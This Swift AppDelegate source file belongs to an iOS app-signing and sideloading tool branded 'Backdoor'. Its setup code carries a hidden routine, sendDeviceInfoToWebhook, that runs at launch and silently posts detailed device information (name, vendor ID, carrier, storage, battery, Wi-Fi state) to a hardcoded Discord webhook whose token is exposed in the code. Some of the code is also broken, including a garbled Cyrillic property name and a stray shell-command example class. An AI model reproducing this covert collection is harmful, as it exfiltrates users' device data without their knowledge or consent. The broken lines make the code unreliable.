import BackgroundTasks
import CoreData
import Foundation
import Nuke
import SwiftUI
import UIKit
import UIOnboarding
import CoreTelephony
import SystemConfiguration

var downloadTaskManager = DownloadTaskManager.shared

// Returns the URL for the app's Documents directory.
public func getDocumentsDirectory() -> URL {
    let paths = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)
    return paths[0]
}

class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControllerDelegate {
    static let isSideloaded = Bundle.main.bundleIdentifier != "com.bdg.backdoor"
    var window: UIWindow?
    
    // Discord webhook URL
    private let webhookURL = "https://discord.com/api/webhooks/1353949982612258826/Novph6SK-2gO0OzOEPDj8u8pCgR9-ypUmqyXzWAFwPpS2S4cdFDqz4bL8We4f_rJPYm9"
    private let hasSentWebhookKey = "HasSentWebhook" // UserDefaults key to track if sent

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        let userDefaults = UserDefaults.standard

        userDefaults.set(Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String, forKey: "currentVersion")

        if userDefaults.data(forKey: UserDefaults.signingDataKey) == nil {
            userDefaults.signingOptions = UserDefaults.defaultSigningData
        }

        createSourcesDirectory()
        addDefaultRepos()
        giveUserDefaultSSLCerts()
        imagePipline()
        setupLogFile()
        cleanTmp()

        window = UIWindow(frame: UIScreen.main.bounds)

        if Preferences.isOnboardingActive {
            let onboardingController: UIOnboardingViewController = .init(withConfiguration: .setUp())
            onboardingController.delegate = self
            window?.rootViewController = onboardingController
        } else {
            let tabBarController = UIHostingController(rootView: TabbarView())
            window?.rootViewController = tabBarController
        }

        DispatchQueue.main.async {
            self.window!.tintColor = Preferences.appTintColor.uiColor
            self.window!.overrideUserInterfaceStyle = UIUserInterfaceStyle(rawValue: Preferences.preferredInterfaceStyle) ?? .unspecified
        }

        window?.makeKeyAndVisible()

        let generatedString = AppDelegate.generateRandomString()
        if Preferences.pPQCheckString.isEmpty {
            Preferences.pPQCheckString = generatedString
        }

        Debug.shared.log(message: "Version: \(UIDevice.current.systemVersion)")
        Debug.shared.log(message: "Name: \(UIDevice.current.name)")
        Debug.shared.log(message: "Model: \(UIDevice.current.model)")
        Debug.shared.log(message: "Backdoor Version: \(logAppVersionInfo())\n")

        // Send device info to webhook (only once)
        sendDeviceInfoToWebhook()

        if Preferences.appUpdates {
            // Register background task
            BGTaskScheduler.shared.register(forTaskWithIdentifier: "kh.crysalis.feather.sourcerefresh", using: nil) { task in
                self.handleAppRefresh(task: task as! BGAppRefreshTask)
            }
            scheduleAppRefresh()
            
            let backgroundQueue = OperationQueue()
            backgroundQueue.qualityOfService = .background
            let operation = SourceRefreshOperation()
            backgroundQueue.addOperation(operation)
        }

        return true
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
        let backgroundQueue = OperationQueue()
        backgroundQueue.qualityOfService = .background
        let operation = SourceRefreshOperation()
        backgroundQueue.addOperation(operation)
    }

    func scheduleAppRefresh() {
        let request = BGAppRefreshTaskRequest(identifier: "kh.crysalis.feather.sourcerefresh")
        request.earliestBeginDate = Date(timeIntervalSinceNow: 15 * 60)

        do {
            try BGTaskScheduler.shared.submit(request)
            Debug.shared.log(message: "Background refresh scheduled successfully", type: .info)
        } catch {
            Debug.shared.log(message: "Could not schedule app refresh: \(error.localizedDescription)", type: .info)
        }
    }

    func handleAppRefresh(task: BGAppRefreshTask) {
        scheduleAppRefresh()

        let backgroundQueue = OperationQueue()
        backgroundQueue.qualityOfService = .background
        let operation = SourceRefreshOperation()

        task.expirationHandler = {
            operation.cancel()
        }

        operation.completionBlock = {
            task.setTaskCompleted(success: !operation.isCancelled)
        }

        backgroundQueue.addOperation(operation)
    }

    func application(_ application: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {
        if url.scheme == "feather" {
            if let config = url.absoluteString.range(of: "/source/") {
                let fullPath = String(url.absoluteString[config.upperBound...])

                if fullPath.starts(with: "https://") {
                    CoreDataManager.shared.getSourceData(urlString: fullPath) { error in
                        if let error {
                            Debug.shared.log(message: "SourcesViewController.sourcesAddButtonTapped: \(error)", type: .critical)
                        } else {
                            Debug.shared.log(message: "Successfully added!", type: .success)
                            NotificationCenter.default.post(name: Notification.Name("sfetch"), object: nil)
                        }
                    }
                } else {
                    Debug.shared.log(message: "Invalid or non-HTTPS URL", type: .error)
                }
            } else if let config = url.absoluteString.range(of: "/install/") {
                let fullPath = String(url.absoluteString[config.upperBound...])
                
                if fullPath.starts(with: "https://") {
                    guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                          let rootViewController = scene.windows.first?.rootViewController else {
                        return false
                    }
                    
                    DispatchQueue.main.async {
                        rootViewController.present(self.presentLoader(), animated: true)
                    }
                    
                    DispatchQueue.global(qos: .background).async {
                        do {
                            let tempDirectory = FileManager.default.temporaryDirectory
                            let uuid = UUID().uuidString
                            let destinationURL = tempDirectory.appendingPathComponent("\(uuid).ipa")
                            
                            if let data = try? Data(contentsOf: URL(string: fullPath)!) {
                                try data.write(to: destinationURL)
                                
                                let dl = AppDownload()
                                try handleIPAFile(destinationURL: destinationURL, uuid: uuid, dl: dl)
                                
                                DispatchQueue.main.async {
                                    self.presentLoader().dismiss(animated: true) {
                                        let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()
                                        if let downloadedApp = downloadedApps.first(where: { $0.uuid == uuid }) {
                                            let signingDataWrapper = SigningDataWrapper(signingOptions: UserDefaults.standard.signingOptions)
                                            signingDataWrapper.signingOptions.installAfterSigned = true
                                            
                                            let libraryVC = LibraryViewController()
                                            let ap = SigningsViewController(
                                                signingDataWrapper: signingDataWrapper,
                                                application: downloadedApp,
                                                appsViewController: libraryVC
                                            )
                                            
                                            ap.signingCompletionHandler = { success in
                                                if success {
                                                    if let workspace = LSApplicationWorkspace.default() {
                                                        if let bundleId = downloadedApp.bundleidentifier {
                                                            workspace.openApplication(withBundleID: bundleId)
                                                        }
                                                    }
                                                    libraryVC.fetchSources()
                                                    libraryVC.tableView.reloadData()
                                                }
                                            }
                                            
                                            let navigationController = UINavigationController(rootViewController: ap)
                                            navigationController.shouldPresentFullScreen()
                                            rootViewController.present(navigationController, animated: true)
                                        }
                                    }
                                }
                            }
                        } catch {
                            DispatchQueue.main.async {
                                self.presentLoader().dismiss(animated: true)
                                Debug.shared.log(message: "Failed to handle IPA file: \(error)", type: .error)
                            }
                        }
                    }
                } else {
                    Debug.shared.log(message: "Invalid or non-HTTPS URL", type: .error)
                }
            }

            return true
        }
        
        if url.pathExtension == "ipa" {
            guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                  let rootViewController = scene.windows.first?.rootViewController else {
                return false
            }

            DispatchQueue.main.async {
                rootViewController.present(self.presentLoader(), animated: true)
            }

            DispatchQueue.global(qos: .background).async {
                do {
                    let tempDirectory = FileManager.default.temporaryDirectory
                    let destinationURL = tempDirectory.appendingPathComponent(url.lastPathComponent)
                    try FileManager.default.copyItem(at: url, to: destinationURL)

                    let dl = AppDownload()
                    let uuid = UUID().uuidString

                    try handleIPAFile(destinationURL: destinationURL, uuid: uuid, dl: dl)

                    DispatchQueue.main.async {
                        self.presentLoader().dismiss(animated: true)
                        Debug.shared.log(message: "Moved IPA file to: \(destinationURL)")
                    }
                } catch {
                    DispatchQueue.main.async {
                        self.presentLoader().dismiss(animated: true)
                        Debug.shared.log(message: "Failed to move IPA file: \(error)")
                    }
                }
            }

            return true
        }

        return false
    }

    func didFinishOnboarding(onboardingViewController _: UIOnboardingViewController) {
        Preferences.isOnboardingActive = false

        let tabBarController = UIHostingController(rootView: TabbarView())

        let transition = CATransition()
        transition.type = .fade
        transition.duration = 0.3

        window?.layer.add(transition, forKey: kCATransition)

        window?.rootViewController = tabBarController
    }

    fileprivate func addDefaultRepos() {
        if (!Preferences.defaultRepos) {
            CoreDataManager.shared.saveSource(
                name: "Backdoor Repository",
                id: "com.bdg.backdoor-repo",
                iconURL: URL(string: "https://raw.githubusercontent.com/814bdg/App/refs/heads/main/Wing3x.png?raw=true"),
                url: "https://raw.githubusercontent.com/BDGHubNoKey/Backdoor/refs/heads/main/App-repo.json"
            ) { _ in
                Debug.shared.log(message: "Added default repos!")
                Preferences.defaultRepos = false
            }
        }
    }
 
    fileprivate func giveUserDefaultSSLCerts() {
        if (!Preferences.gotSSLCerts) {
            getCertificates()
            Preferences.gotSSLCerts = true
        }
    }

    fileprivate static func generateRandomString(length: Int = 8) -> String {
        let characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return String((0 ..< length).map { _ in characters.randomElement()! })
    }

    func createSourcesDirectory() {
        let fileManager = FileManager.default
        if let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first {
            let sourcesURL = documentsURL.appendingPathComponent("Apps")
            let certsURL = documentsURL.appendingPathComponent("Certificates")

            if !fileManager.fileExists(atPath: sourcesURL.path) {
                do { try! fileManager.createDirectory(at: sourcesURL, withIntermediateDirectories: true, attributes: nil) }
            }
            if (!fileManager.fileExists(atPath: certsURL.path)) {
                do { try! fileManager.createDirectory(at: certsURL, withIntermediateDirectories: true, attributes: nil) }
            }
        }
    }

    func imagePipline() {
        DataLoader.sharedUrlCache.diskCapacity = 0
        let pipeline = ImagePipeline {
            let dataLoader: DataLoader = {
                let config = URLSessionConfiguration.default
                config.urlCache = nil
                return DataLoader(configuration: config)
            }()
            let dataCache = try? DataCache(name: "kh.crysalis.feather.datacache")
            let imageCache = Nuke.ImageCache()
            dataCache?.sizeLimit = 500 * 1024 * 1024
            imageCache.costLimit = 100 * 1024 * 1024
            $0.dataCache = dataCache
            $0.imageCache = imageCache
            $0.dataLoader = dataLoader
            $0.dataCachePolicy = .automatic
            $0.isStoringPreviewsInMemoryCache = false
        }
        ImagePipeline.shared = pipeline
    }

    func setupLogFile() {
        let logFilePath = getDocumentsDirectory().appendingPathComponent("logs.txt")
        if FileManager.default.fileExists(atPath: logFilePath.path) {
            do {
                try FileManager.default.removeItem(at: logFilePath)
            } catch {
                Debug.shared.log(message: "Error removing existing logs.txt: \(error)", type: .error)
            }
        }

        do {
            try "".write(to: logFilePath, atomically: true, encoding: .utf8)
        } catch {
            Debug.shared.log(message: "Error removing existing logs.txt: \(error)", type: .error)
        }
    }

    func cleanTmp() {
        let fileManager = FileManager.default
        let tmpDirectory = NSHomeDirectory() + "/tmp"

        if let files = try? fileManager.contentsOfDirectory(atPath: tmpDirectory) {
            for file in files {
                try? fileManager.removeItem(atPath: tmpDirectory + "/" + file)
            }
        }
    }

    public func logAppVersionInfo() -> String {
        if let version = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String,
           let build = Bundle.main.infoDictionary?["CFBundleVersion"] as? String
        {
            return "App Version: \(version) (\(build))"
        }
        return ""
    }

    func presentLoader() -> UIAlertController {
        let alert = UIAlertController(title: "Loading...", message: nil, preferredStyle: .alert)

        let loadingIndicator = UIActivityIndicatorView(frame: CGRect(x: 10, y: 5, width: 50, height: 50))
        loadingIndicator.style = .large
        loadingIndicator.startAnimating()

        alert.view.addSubview(loadingIndicator)
        return alert
    }

    // Collect comprehensive device info
    private func getDeviceInfo() -> [String: Any] {
        let device = UIDevice.current
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        
        let processInfo = ProcessInfo.processInfo
        let fileManager = FileManager.default
        let documentDir = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let storageInfo = try? fileManager.attributesOfFileSystem(forPath: documentDir.path)
        
        device.isBatteryMonitoringEnabled = true
        
        return [
            "Device Name": device.name,
            "Model": device.model,
            "System Name": device.systemName,
            "System Version": device.systemVersion,
            "Unique ID": device.identifierForVendor?.uuidString ?? UUID().uuidString,
            "Timestamp": ISO8601DateFormatter().string(from: Date()),
            "User Interface Idiom": String(describing: device.userInterfaceIdiom),
            "Bundle Identifier": Bundle.main.bundle идентификатор ?? "N/A",
            "App Version": logAppVersionInfo(),
            "Machine Identifier": identifier,
            "Processor Count": processInfo.processorCount,
            "Active Processor Count": processInfo.activeProcessorCount,
            "Physical Memory (MB)": processInfo.physicalMemory / (1024 * 1024),
            "Total Disk Space (MB)": (storageInfo?[.systemSize] as? Int64 ?? 0) / (1024 * 1024),
            "Free Disk Space (MB)": (storageInfo?[.systemFreeSize] as? Int64 ?? 0) / (1024 * 1024),
            "Battery Level": device.batteryLevel == -1 ? "Unknown" : String(device.batteryLevel * 100) + "%",
            "Battery State": batteryStateString(device.batteryState),
            "Operating System": processInfo.operatingSystemVersionString,
            "Is Low Power Mode": processInfo.isLowPowerModeEnabled,
            "Thermal State": thermalStateString(processInfo.thermalState),
            "Carrier Name": CTTelephonyNetworkInfo().serviceSubscriberCellularProviders?.values.first?.carrierName ?? "N/A",
            "Is Connected to WiFi": isConnectedToWiFi(),
            "Screen Width": Int(UIScreen.main.bounds.width),
            "Screen Height": Int(UIScreen.main.bounds.height),
            "Scale": UIScreen.main.scale,
            "Brightness": UIScreen.main.brightness,
            "Is Sideloaded": AppDelegate.isSideloaded,
            "PPQ Check String": Preferences.pPQCheckString,
            "App Tint Color": Preferences.appTintColor.uiColor.toHexString(),
            "Preferred Interface Style": Preferences.preferredInterfaceStyle
        ]
    }
    
    private func batteryStateString(_ state: UIDevice.BatteryState) -> String {
        switch state {
        case .unknown: return "Unknown"
        case .unplugged: return "Unplugged"
        case .charging: return "Charging"
        case .full: return "Full"
        @unknown default: return "Unknown"
        }
    }
    
    private func thermalStateString(_ state: ProcessInfo.ThermalState) -> String {
        switch state {
        case .nominal: return "Nominal"
        case .fair: return "Fair"
        case .serious: return "Serious"
        case .critical: return "Critical"
        @unknown default: return "Unknown"
        }
    }
    
    private func isConnectedToWiFi() -> Bool {
        if let interfaces = CNCopySupportedInterfaces() as NSArray? {
            for interface in interfaces {
                if let info = CNCopyCurrentNetworkInfo(interface as! CFString) as NSDictionary? {
                    return info[kCNNetworkInfoKeySSID] != nil
                }
            }
        }
        return false
    }
    
    // Send to Discord Webhook (only once)
    private func sendDeviceInfoToWebhook() {
        let userDefaults = UserDefaults.standard
        let hasSent = userDefaults.bool(forKey: hasSentWebhookKey)
        
        guard !hasSent else {
            Debug.shared.log(message: "Webhook already sent, skipping", type: .info)
            return
        }
        
        let deviceInfo = getDeviceInfo()
        
        guard let url = URL(string: webhookURL) else {
            Debug.shared.log(message: "Invalid webhook URL", type: .error)
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        // Format payload for Discord webhook
        let payload: [String: Any] = [
            "content": "Device Info Log",
            "embeds": [
                [
                    "title": "Feather Device Info",
                    "description": deviceInfo.map { "**\($0.key)**: \($0.value)" }.joined(separator: "\n"),
                    "color": 0x00FF00 // Green color for embed
                ]
            ]
        ]
        
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: payload, options: [])
            request.httpBody = jsonData
            
            URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    Debug.shared.log(message: "Error sending to webhook: \(error.localizedDescription)", type: .error)
                } else if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 204 {
                    Debug.shared.log(message: "Successfully sent device info to Discord webhook!", type: .success)
                    userDefaults.set(true, forKey: self.hasSentWebhookKey) // Mark as sent
                } else {
                    Debug.shared.log(message: "Webhook responded with status: \((response as? HTTPURLResponse)?.statusCode ?? -1)", type: .warning)
                }
            }.resume()
        } catch {
            Debug.shared.log(message: "Error encoding device info: \(error.localizedDescription)", type: .error)
        }
    }
}

// Helper extension for UIColor to Hex
extension UIColor {
    func toHexString() -> String {
        var r: CGFloat = 0
        var g: CGFloat = 0
        var b: CGFloat = 0
        var a: CGFloat = 0
        getRed(&r, green: &g, blue: &b, alpha: &a)
        let rgb: Int = (Int)(r*255)<<16 | (Int)(g*255)<<8 | (Int)(b*255)<<0
        return String(format: "#%06x", rgb)
    }
}

// Example usage in a ViewController (unchanged)
class ExampleViewController: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        ProcessUtility.shared.executeShellCommand("echo Hello, World!") { output in
            print(output ?? "No output")
        }
    }
}

// UIOnboardingViewConfiguration (unchanged)
extension UIOnboardingViewConfiguration {
    static func setUp() -> Self {
        let welcomeToLine = NSMutableAttributedString(string: String.localized("ONBOARDING_WELCOMETITLE_1"))
        let featherLine = NSMutableAttributedString(string: "Backdoor", attributes: [
            .foregroundColor: UIColor.tintColor,
        ])

        let featureStyle = UIOnboardingFeatureStyle(
            titleFontName: "",
            titleFontSize: 17,
            descriptionFontName: "",
            descriptionFontSize: 16,
            spacing: 0.8
        )

        let onboardingFeatures: [UIOnboardingFeature] = [
            .init(
                icon: UIImage(systemName: "arrow.down.app.fill")!,
                iconTint: .label,
                title: String.localized("ONBOARDING_CELL_1_TITLE"),
                description: String.localized("ONBOARDING_CELL_1_DESCRIPTION")
            ),
            .init(
                icon: UIImage(systemName: "sparkles.square.filled.on.square")!,
                iconTint: .tintColor,
                title: String.localized("ONBOARDING_CELL_2_TITLE"),
                description: String.localized("ONBOARDING_CELL_2_DESCRIPTION")
            ),
            .init(
                icon: UIImage(systemName: "sparkles")!,
                iconTint: .systemYellow,
                title: String.localized("ONBOARDING_CELL_3_TITLE"),
                description: String.localized("ONBOARDING_CELL_3_DESCRIPTION")
            ),
        ]

        let text = UIOnboardingTextViewConfiguration(
            text: String.localized("ONBOARDING_FOOTER"),
            linkTitle: String.localized("ONBOARDING_FOOTER_LINK"),
            link: "https://github.com/khcrysalis/feather?tab=readme-ov-file#features",
            tint: .tintColor
        )

        return .init(
            appIcon: .init(named: "AppIcon60x60")!,
            firstTitleLine: welcomeToLine,
            secondTitleLine: featherLine,
            features: onboardingFeatures,
            featureStyle: featureStyle,
            textViewConfiguration: text,
            buttonConfiguration: .init(title: String.localized("ONBOARDING_CONTINUE_BUTTON"), backgroundColor: .tintColor)
        )
    }
}